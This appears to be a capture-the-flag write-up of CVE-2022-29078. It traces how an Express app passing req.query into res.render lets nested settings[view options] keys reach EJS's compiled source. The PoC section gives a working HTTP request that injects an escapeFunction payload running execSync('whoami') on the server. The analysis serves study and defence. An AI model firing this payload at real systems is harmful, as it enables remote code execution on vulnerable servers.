# dh:5: ejs @3.1.8 CVE-2022-29078

https://dreamhack.io/wargame/challenges/675

## Background

A server-side template injection (SSTI) in EJS (Embedded JavaScript) can lead to remote code execution (RCE) when untrusted input is passed into the template engine as rendering options.

https://github.com/mde/ejs/security

**app.js**:
```
$ cat app.js 
const express = require('express');
var path = require('path');
const app = express();
const port = 3000;
 
app.set('views', path.join(__dirname, '/templates'));
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
   res.render('index', req.query )
})
 
app.listen(port, () => {})
```
**package.json**:

```
$ cat package.json 
{
  "dependencies": {
    "ejs": "^3.1.8",
    "express": "^4.18.2"
  }
}
```
The vulnerability is tracked as CVE-2022-29078 (originally demonstrated against EJS 3.1.6 and fixed in 3.1.7+). This challenge targets an environment using EJS ~3.1.x; exploitability depends on the application’s code and Express query-parser configuration.

## Analysis

NVD:    https://nvd.nist.gov/vuln/detail/CVE-2022-29078

### Vulnerable flow

Express-based applications often call a template renderer with a data object that can contain application settings or view options.

1. `res.render(template, data)` → `renderFile` consumes `data = args.shift()` so forwarded request parameters become data properties.

2. If `data.settings['view options']` exists, renderFile calls `utils.shallowCopy(opts, viewOpts)`, performing `to[p] = from[p]` for every key with no whitelisting or sanitization.

3. When `opts.client === true`, EJS generates a client-style function and stringifies/injects certain option values (for example escape or function-like options) into the compiled source.

4. If an payload reaches a slot concatenated directly into generated JS, the injected string becomes part of the source and is parsed/executed by V8 when the template is compiled/run.

### Express Query Parser Difference

Express 4.x commonly uses extended (qs) parsing which turns bracketed queries into nested objects. 

Express 5.x defaults to simple (querystring) parsing which treats bracketed keys as plain strings (no nesting). The `settings[...]` vector requires nested parsing (qs) or another input path that produces nested objects.

### Code Analysis

https://github.com/mde/ejs/releases/tag/v3.1.8

**`renderFile` merges incoming `data/settings` into `opts`**:
```
exports.renderFile = function () {
  var args = Array.prototype.slice.call(arguments);
  var filename = args.shift();
  var cb;
  var opts = { filename: filename };
  var data;
  var viewOpts;

  if (args.length) {
    data = args.shift();

    // express 3/4 special-casing: pull settings and view options
    if (data.settings) {
      if (data.settings.views) {
        opts.views = data.settings.views;
      }
      if (data.settings['view cache']) {
        opts.cache = true;
      }
      viewOpts = data.settings['view options'];
      if (viewOpts) {
        // <-- shallowCopy merges viewOpts into opts without sanitization
        utils.shallowCopy(opts, viewOpts);
      }
    }

    // ... opts.filename = filename;
  } else {
    data = {};
  }

  return tryHandleCache(opts, data, cb);
};
```
When `req.query` is passed into `res.render()`, the first argument consumed by `renderFile` becomes the template `data` object (`data = args.shift()`).

A query like `?name=admin`  yields `data = { name: "admin" }`, so untrusted query keys/values can propagate into `data` and into `data.settings['view options']`, enabling the injection vector. 

It shows where `view options` (if present on the data object passed to renderFile) is merged into the internal `opts`

**`shallowCopy` (unsafe copy)**:

```
exports.shallowCopy = function (to, from) {
  from = from || {};
  for (var p in from) {
    to[p] = from[p];   // direct assignment of keys/values from from into to
  }
  return to;
};
```

No filtering, type-checking, or key whitelisting occurs here; any enumerable property on `from` is copied into `to`. This enables attacker-controlled keys/values to land in `opts`.

**EJS generates source that may interpolate `opts` values**:
```
if (!this.source) {
  this.generateSource();
  prepended +=
    '  var __output = "";\n' +
    '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
  if (opts.outputFunctionName) {
    // <-- attacker cancontrol text in opts.outputFunctionName is concatenated into JS source
    prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
  }
  // ...
}
```

Because `opts.outputFunctionName` is concatenated into the generated source string, malicious payload in that field (if reachable) becomes part of executable JS source.

`req.query` can be forwarded into `res.render(..., data)` or into `app.locals/settings`, generating a data object that contains `settings['view options']`. `renderFile` shallow-copies `view options` into `opts` via `utils.shallowCopy`.

The template compiler includes some `opts` values verbatim in the generated JavaScript source (for example `opts.outputFunctionName`). 

## PoC 

**payload**:
```
GET /path/to/view?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami'); HTTP/1.1
Host: target
```

`escapeFunction` is one of the options that EJS will convert to source text when `client=true`; that means a value provided for `escapeFunction` gets pasted directly into the generated JavaScript function and will run as code. `client=true` makes EJS build a JavaScript function (a client-side renderer) and turns some option values into raw JS text. 

If an attacker controls one of those values, it gets pasted directly into that function’s source and runs when the function is created which is what allows source-level injection.

## TL;DR 

Express 4.18.2 (qs/extended parsing) turns `settings[view options][...]` into a nested object, so `req.query` becomes `data.settings['view options']`.

The app forwards that `req.query` into `res.render()`, and `renderFile` does utils.`shallowCopy(opts, viewOpts)`, so the attacker string lands in `opts.escapeFunction`.

EJS in the client code path stringifies/injects function-like options into generated JS; with `client=true` the injected value is concatenated into the template source, and the `;return ...execSync('whoami')` fragment breaks out and executes, yielding RCE.

## References

- EJS repository & releases: EJS v3.1.x.
- NVD: CVE-2022-29078.
- Public analyses and community writeups.
